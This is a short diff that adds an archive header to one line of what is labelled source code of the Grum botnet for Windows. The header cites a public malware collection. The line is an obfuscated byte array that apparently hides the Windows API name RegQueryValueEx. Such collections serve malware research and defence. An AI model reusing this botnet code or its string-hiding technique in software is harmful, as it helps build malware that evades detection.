@@ -1,1 +1,12 @@
+/*
+  name      Grum
+  type      botnet
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     —
+ */
 BYTE g_func_regqueryvalueex[]={0x6,0x30,0x31,0x6,0x2d,0x3c,0x28,0x22,0xa,0x3c,0x32,0x2a,0x5,0x24,0x1a,0x22,0x64};
